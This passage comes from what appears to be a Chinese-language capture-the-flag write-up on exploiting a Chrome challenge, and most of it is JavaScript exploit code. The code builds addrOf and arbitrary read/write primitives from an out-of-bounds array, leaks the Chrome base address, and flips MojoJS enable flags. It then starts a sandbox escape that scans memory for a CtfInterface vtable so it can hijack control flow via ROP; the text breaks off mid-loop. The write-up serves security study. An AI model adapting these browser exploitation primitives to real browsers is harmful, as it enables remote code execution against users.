<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"mojo/mojo_bindings.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> int_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">function</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> float_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'oob_arr.length = '</span> <span class="token operator">+</span> oob_arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
    <span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
    <span class="token keyword">let</span> r13 <span class="token operator">=</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_28 = '</span> <span class="token operator">+</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_29 = '</span> <span class="token operator">+</span> old_29<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
    <span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
        <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'div_addr = '</span> <span class="token operator">+</span> div_addr<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>


    <span class="token comment">// enable mojo</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_test_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Mojo<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"enabling mojo ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sandbox escape ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">await</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="Sandbox-Escape"><a href="#Sandbox-Escape" class="headerlink" title="Sandbox Escape"></a>Sandbox Escape</h4><p>刷新页面之后就开启了 Mojo，可以开始与 Mojo 交互了</p>
<p>先写好与 CtfInterface 交互的函数：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> float_val <span class="token operator">=</span>  <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> float_val<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">resizeVector</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> ctf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterfacePtr</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mojo<span class="token punctuation">.</span>makeRequest</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    Mojo<span class="token punctuation">.</span><span class="token function">bindInterface</span><span class="token punctuation">(</span>blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>CtfInterface<span class="token punctuation">.</span>name<span class="token punctuation">,</span> req<span class="token punctuation">.</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> ctf<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于与 Mojo 的通信方式大多数是回调的方式（从 C++ 源码中也可以发现），基本都是异步的，为了方便，使用 async 的函数来写</p>
<p>Mojo 与 v8 运行在不同的进程里，我们还要 leak 出 Mojo 所在进程的地址，才能在后续构造 ROP 拿 shell</p>
<p>逆向可以发现 Ctf 对象存在如下结构：</p>
<pre class="line-numbers language-none"><code class="language-none">+ 0x00 vtable_ptr
+ 0x08 vector_base
+ 0x10 vector_end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>只要通过越界写，更改 vtable_ptr 即可劫持虚表，从而劫持程序控制流，控制 <code>vector_base</code> 和 <code>vector_base</code> 字段还可以方便的进行任意地址的读写</p>
<h5 id="find-Ctf-Object"><a href="#find-Ctf-Object" class="headerlink" title="find Ctf Object"></a>find Ctf Object</h5><p>由于 Mojo 对象的内存地址不稳定， 需要不断的分配对象，根据特征，直到找到为止：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> vec_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> vec_end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> rop_len <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> vtable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> vtable_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> ctf<span class="token punctuation">,</span> arb<span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'finding vector address...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>vtable_offset <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ctf <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    arb <span class="token operator">=</span> <span class="token function">ctfCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> rop_len<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> rop_len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0xfebabedeadbeefn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> <span class="token number">0xfffn</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4e0n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//(vtable &amp; 0xfff) == 0x4e0</span>
            <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> end <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">></span> base <span class="token operator">&amp;&amp;</span> <span class="token function">Number</span><span class="token punctuation">(</span>end <span class="token operator">-</span> base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">*</span> rop_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// found!</span>
                vtable <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                vec_base <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
                vec_end <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">;</span>
                vtable_offset <span class="token operator">=</span> i<span class="token punctuation">;</span>

                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable_offset<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">: vtable = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vtable<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_base = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_base<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, vec_end = 0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>vec_end<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token comment">// for (let i = 4; i &lt; 0x1000; i++)</span>
